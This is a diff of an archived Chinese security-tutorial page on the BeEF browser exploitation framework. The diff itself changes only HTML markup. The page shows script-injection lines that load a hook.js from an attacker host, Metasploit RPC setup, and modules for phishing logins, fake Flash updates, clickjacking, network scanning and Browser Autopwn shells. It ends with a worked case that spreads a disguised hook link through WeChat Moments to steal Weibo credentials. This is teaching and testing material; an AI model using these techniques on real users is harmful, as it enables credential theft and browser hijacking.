@@ -3,34 +3,34 @@
 			<head>
 			     <title>浏览器利用框架BeEF测试 - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/9929">http://drops.wooyun.org/tips/9929</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 目前对其测试的文章不是很多，所以希望通过本次测试给大家带来全新的认识。</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145062830.net/20151022083146982" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145062830.net/20151022083146982" alt="这里写图片描述"></p>
 
 <!--more-->
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
 <p>工具主页：<a href="http://beefproject.com">http://beefproject.com</a></p>
 
 <p>工具框架:</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145185793.net/20151022083159570" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145185793.net/20151022083159570" alt="这里写图片描述"></p>
 
 <h1>0x02 测试环境</h1>
 
-<hr />
+<hr>
 
 <p>攻击主机:</p>
 
@@ -50,7 +50,7 @@ IP:192.168.16.197
 开启JS注入功能
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145157165.net/20151022083213344" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145157165.net/20151022083213344" alt="这里写图片描述"></p>
 
 <p><strong><em>Tips：</em></strong></p>
 
@@ -61,32 +61,32 @@ document.write("&lt;script language='javascript' src='http://192.168.16.245:3000
 默认情况下JS注入附带缓存投毒功能，将视图缓存所有的页面至2099年，但可以通过清除所有缓存及浏览数据来清除缓存投毒的影响。
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145270248.net/20151022083228639" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145270248.net/20151022083228639" alt="这里写图片描述"></p>
 
 <h1>0x03 BeEF参数配置</h1>
 
-<hr />
+<hr>
 
 <p>BeEF在Kali下默认安装，直接找到对应图标启动即可，但是默认设置未同Metasploit关联，无法使用msf模块，因此需要作如下配置连接msf</p>
 
 <h2>1、修改config.yaml</h2>
 
-<p>编辑<br />
+<p>编辑<br>
 <code>/usr/share/beef-xss/config.yaml</code></p>
 
 <pre><code>metasploit:
             enable: false改为true
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145346766.net/20151022104332165" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145346766.net/20151022104332165" alt="这里写图片描述"></p>
 
-<p>编辑<br />
+<p>编辑<br>
 <code>/usr/share/beef-xss/extensions/demos/config.yaml</code></p>
 
 <pre><code>enable:true改为false
 </code></pre>
 
-<p>编辑<br />
+<p>编辑<br>
 <code>/usr/share/beef-xss/extensions/metasploit/config.yaml</code></p>
 
 <pre><code>设置
@@ -94,7 +94,7 @@ document.write("&lt;script language='javascript' src='http://192.168.16.245:3000
     ssl_version: 'TLSv1'
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145357713.net/20151022104345499" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145357713.net/20151022104345499" alt="这里写图片描述"></p>
 
 <h2>2、启动msf服务</h2>
 
@@ -112,7 +112,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>（启动后不要关闭，不然登录界面会提示密码错误）</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145317624.net/20151022104402951" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145317624.net/20151022104402951" alt="这里写图片描述"></p>
 
 <h2>4、启动BeEF</h2>
 
@@ -120,11 +120,11 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>主界面如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145449856.net/20151022083247247" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145449856.net/20151022083247247" alt="这里写图片描述"></p>
 
 <h1>0x04 功能介绍</h1>
 
-<hr />
+<hr>
 
 <p>对基本功能做全面介绍，高级用法以后会做补充</p>
 
@@ -140,15 +140,15 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>收集方法：</p>
 
-<p>（1）自动默认收集信息<br />
+<p>（1）自动默认收集信息<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145585577.net/20151022083300750" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145585577.net/20151022083300750" alt="这里写图片描述"></p>
 
-<p>（2）插件收集信息<br />
+<p>（2）插件收集信息<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145540408.net/20151022083309821" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145540408.net/20151022083309821" alt="这里写图片描述"></p>
 
 <p><strong><em>Tips：</em></strong></p>
 
@@ -172,11 +172,11 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145663762.net/20151022083323152" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145663762.net/20151022083323152" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145671713.net/20151022083332056" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145671713.net/20151022083332056" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145769389.net/20151022083340397" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145769389.net/20151022083340397" alt="这里写图片描述"></p>
 
 <p><strong>3、用户行为</strong></p>
 
@@ -189,7 +189,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145782182.net/20151022083350643" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145782182.net/20151022083350643" alt="这里写图片描述"></p>
 
 <h2>2-社会工程</h2>
 
@@ -205,31 +205,31 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>选择的登录框模板,如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145856372.net/20151022083404865" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145856372.net/20151022083404865" alt="这里写图片描述"></p>
 
 <p>配置后用户浏览器界面,如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301145879803.net/20151022083415070" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301145879803.net/20151022083415070" alt="这里写图片描述"></p>
 
 <p>当用户输入信息后，自动获取，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102302210051649.net/20151022083424837" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102302210051649.net/20151022083424837" alt="这里写图片描述"></p>
 
 <p><strong>Simple Hijacker模块:</strong></p>
 
-<p>劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名<br />
+<p>劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150113920.net/20151022083437512" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150113920.net/20151022083437512" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150154942.net/20151022083445466" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150154942.net/20151022083445466" alt="这里写图片描述"></p>
 
 <p><strong>Clippy模块：</strong></p>
 
-<p>创建一个浏览器助手提示用户点击<br />
+<p>创建一个浏览器助手提示用户点击<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150267543.net/20151022083456544" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150267543.net/20151022083456544" alt="这里写图片描述"></p>
 
 <p><strong>2、重定向</strong></p>
 
@@ -239,45 +239,45 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p><strong>Rediret Browser(iframe)模块：</strong></p>
 
-<p>将当前页面重定向至指定页面，，同时保留当前连接，可以维持当前浏览器权限<br />
+<p>将当前页面重定向至指定页面，，同时保留当前连接，可以维持当前浏览器权限<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150256728.net/20151022083509229" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150256728.net/20151022083509229" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150362535.net/20151022083517486" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150362535.net/20151022083517486" alt="这里写图片描述"></p>
 
 <p><strong>TabNabbing模块：</strong></p>
 
-<p>当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面<br />
+<p>当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150377764.net/20151022083528801" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150377764.net/20151022083528801" alt="这里写图片描述"></p>
 
 <p><strong>3、Chrome/Firefox extensions</strong></p>
 
 <p><strong>Fake Flash Update模块：</strong></p>
 
-<p>提示用户安装Adobe Flash Player的更新，用户点击后会下载指定文件<br />
+<p>提示用户安装Adobe Flash Player的更新，用户点击后会下载指定文件<br>
 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150496763.net/20151022083541006" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150496763.net/20151022083541006" alt="这里写图片描述"></p>
 
 <p><strong>Chrome Extensions 系列：</strong></p>
 
 <p>值得尝试</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150461161.net/20151022083557973" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150461161.net/20151022083557973" alt="这里写图片描述"></p>
 
 <p><strong>4、补充</strong></p>
 
 <p><strong>Clickjacking模块：</strong></p>
 
-<p>可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码<br />
+<p>可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码<br>
 如图，鼠标后面跟随一个iframe</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150418022.net/20151022083610151" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150418022.net/20151022083610151" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150580322.net/20151022083616748" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150580322.net/20151022083616748" alt="这里写图片描述"></p>
 
 <h2>3-网络扫描</h2>
 
@@ -297,7 +297,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>识别内网网关，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150562397.net/20151022083627694" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150562397.net/20151022083627694" alt="这里写图片描述"></p>
 
 <p><strong>3、识别HTTP Servers</strong></p>
 
@@ -311,7 +311,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150670607.net/20151022083637572" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150670607.net/20151022083637572" alt="这里写图片描述"></p>
 
 <p><strong>5、跨域扫描</strong></p>
 
@@ -319,7 +319,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150661420.net/20151022083647034" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150661420.net/20151022083647034" alt="这里写图片描述"></p>
 
 <p><strong>7、端口扫描</strong></p>
 
@@ -327,9 +327,9 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150756867.net/20151022083702339" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150756867.net/20151022083702339" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150733438.net/20151022083711912" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150733438.net/20151022083711912" alt="这里写图片描述"></p>
 
 <p><strong>8、网络指纹特征扫描</strong></p>
 
@@ -339,7 +339,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150847214.net/20151022083720822" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150847214.net/20151022083720822" alt="这里写图片描述"></p>
 
 <p><strong>9、Remote CSRFs</strong></p>
 
@@ -351,11 +351,11 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>BeEF可根据扫描获得的信息绘制内网网络拓扑 如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150814032.net/20151022083731946" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150814032.net/20151022083731946" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150993686.net/20151022083739902" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150993686.net/20151022083739902" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301150983980.net/20151022083748579" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301150983980.net/20151022083748579" alt="这里写图片描述"></p>
 
 <p>此部分会在以后详细介绍</p>
 
@@ -365,7 +365,7 @@ load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151061745.net/20151022083758254" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151061745.net/20151022083758254" alt="这里写图片描述"></p>
 
 <p><strong>2、Browser Autopwn</strong></p>
 
@@ -385,15 +385,15 @@ run -z
 
 <p>生成一个链接，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151011311.net/20151022083810204" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151011311.net/20151022083810204" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151133837.net/20151022083817418" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151133837.net/20151022083817418" alt="这里写图片描述"></p>
 
 <p><strong>（2）</strong>使用"Create Invisible Iframe"模块加载autopwn页面</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151147323.net/20151022083828136" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151147323.net/20151022083828136" alt="这里写图片描述"></p>
 
 <p><strong>（3）</strong>等待弹回shell</p>
 
@@ -410,16 +410,16 @@ run -z
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151241719.net/20151022083840702" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151241719.net/20151022083840702" alt="这里写图片描述"></p>
 
 <p><strong>2、</strong>浏览器代理设置</p>
 
-<p>HTTP Proxy：127.0.0.1<br />
+<p>HTTP Proxy：127.0.0.1<br>
 Port：6789</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151387599.net/20151022083849851" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151387599.net/20151022083849851" alt="这里写图片描述"></p>
 
 <p>细节以后补充</p>
 
@@ -429,7 +429,7 @@ Port：6789</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151419037.net/20151022083900296" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151419037.net/20151022083900296" alt="这里写图片描述"></p>
 
 <p>细节以后补充</p>
 
@@ -439,33 +439,33 @@ Port：6789</p>
 
 <p>创建一个新窗口，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151411108.net/20151022083914494" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151411108.net/20151022083914494" alt="这里写图片描述"></p>
 
 <p>反弹一个新权限，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151569782.net/20151022083922383" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151569782.net/20151022083922383" alt="这里写图片描述"></p>
 
 <p><strong>2、Confirm Close Tab模块</strong></p>
 
 <p>当用户关闭当前页面时，反复弹出确认是否关闭页面的消息</p>
 
-<p><strong>3、Create Foreground iFrame模块</strong> 修改当前页面所有链接来避免离开当前页面<br />
+<p><strong>3、Create Foreground iFrame模块</strong> 修改当前页面所有链接来避免离开当前页面<br>
 比如用户点击某个连接，会将新页面显示在当前页面上面，注意的是网址不会发送改变，如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151565410.net/20151022083934216" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151565410.net/20151022083934216" alt="这里写图片描述"></p>
 
 <p>正常访问的页面为：（注意看地址栏）</p>
 
-<p><img src="http://static.wooyun.org//drops/20151023/2015102301151580912.net/20151022083942733" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151023/2015102301151580912.net/20151022083942733" alt="这里写图片描述"></p>
 
 <p><strong>4、Man In The Browser模块</strong></p>
 
-<p>可拦截修改页面内所有链接，当用户点击当前页面的任意链接后仍可维持权限（必须是同源的页面）<br />
+<p>可拦截修改页面内所有链接，当用户点击当前页面的任意链接后仍可维持权限（必须是同源的页面）<br>
 如果用户手动更改URL地址栏，无法维持权限</p>
 
 <h1>0x05 小结</h1>
 
-<hr />
+<hr>
 
 <p>本文仅对BeEF的基本功能做了全面介绍，更多高级技巧很值得研究，例如利用BeEF内网渗透，利用代理不通过cookie登陆账户突破IP限制绑定等等。</p>
 
@@ -475,7 +475,7 @@ Port：6789</p>
 
 <h1>0x06 补充</h1>
 
-<hr />
+<hr>
 
 <p>对手机平台的微信使用BeEF进行模拟测试</p>
 
@@ -490,11 +490,11 @@ Port：6789</p>
 
 <p>扫描后在BeEF控制端看到手机上线，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054147703.net/20151026163837987" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054147703.net/20151026163837987" alt="这里写图片描述"></p>
 
 <p>对此页面进行Google Phishing欺骗，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054297348.net/20151026163847667" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054297348.net/20151026163847667" alt="这里写图片描述"></p>
 
 <p><strong>注：</strong></p>
 
@@ -504,17 +504,17 @@ Port：6789</p>
 
 <p>将BeEF的上线地址做一下简单的伪装并分享到朋友圈，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054264998.net/20151026163905325" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054264998.net/20151026163905325" alt="这里写图片描述"></p>
 
 <p>在朋友圈中同样无法看到包含的真实URL地址，打开即为BeEF的hook页面，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054319626.net/20151026163914384" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054319626.net/20151026163914384" alt="这里写图片描述"></p>
 
 <p><strong>3、朋友发来的链接</strong></p>
 
 <p>将此消息直接发给朋友，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054330130.net/20151026163924054" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054330130.net/20151026163924054" alt="这里写图片描述"></p>
 
 <p>我们可以看到伪造前的URL地址</p>
 
@@ -532,7 +532,7 @@ Port：6789</p>
 
 <p>除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054378723.net/20151026163934233" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054378723.net/20151026163934233" alt="这里写图片描述"></p>
 
 <p>以下是经测试可以在Android上使用的模块：</p>
 
@@ -545,7 +545,7 @@ Port：6789</p>
 7、NetWork系列，可以用来扫描同一内网下的windows主机
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054446980.net/20151026163943506" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054446980.net/20151026163943506" alt="这里写图片描述"></p>
 
 <p><strong>注：</strong></p>
 
@@ -553,7 +553,7 @@ Port：6789</p>
 
 <h1>0x07 利用朋友圈投票社工微博帐号实例</h1>
 
-<hr />
+<hr>
 
 <h2>1、伪造BeEF的hook页面</h2>
 
@@ -575,9 +575,9 @@ type="text/javascript"&gt;&lt;\/script&gt;';
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054442197.net/20151026193230131" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054442197.net/20151026193230131" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707054595128.net/20151026193237033" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707054595128.net/20151026193237033" alt="这里写图片描述"></p>
 
 <p>上线页面已被修改</p>
 
@@ -659,7 +659,7 @@ id="buttonpress" name="buttonpress" value="false"/&gt;&lt;/div&gt;&lt;/div&gt;&l
 
 <p><strong>1、</strong>微信朋友圈发布投票消息，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707055832230.net/20151026193255132" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707055832230.net/20151026193255132" alt="这里写图片描述"></p>
 
 <p>用户点击后会打开我们伪造的投票页面，同时隐蔽加载hook.js，在BeEF端上线</p>
 
@@ -667,27 +667,27 @@ id="buttonpress" name="buttonpress" value="false"/&gt;&lt;/div&gt;&lt;/div&gt;&l
 
 <p>如图执行Pretty Theft模块</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707055961806.net/20151026193309303" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707055961806.net/20151026193309303" alt="这里写图片描述"></p>
 
 <p>用户手机界面如图，弹出对话框提示输入登录消息</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707055994211.net/20151026193324698" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707055994211.net/20151026193324698" alt="这里写图片描述"></p>
 
 <p>BeEF控制端返回用户输入消息，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707060088962.net/20151026193334061" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707060088962.net/20151026193334061" alt="这里写图片描述"></p>
 
 <p><strong>3、</strong>用户提交后重定向至另一页面</p>
 
 <p>BeEF控制端使用Redirect Browser（iFrame）模块，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707060010150.net/20151026193342717" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707060010150.net/20151026193342717" alt="这里写图片描述"></p>
 
 <p>用户手机界面如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151027/2015102707060195169.net/20151026193355641" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20151027/2015102707060195169.net/20151026193355641" alt="这里写图片描述"></p>
 
-<p>至此，通过朋友圈投票获得微博帐号成功实现。</p>      </p>
+<p>至此，通过朋友圈投票获得微博帐号成功实现。</p>      <p></p>
     
 			</body>
 		</html>
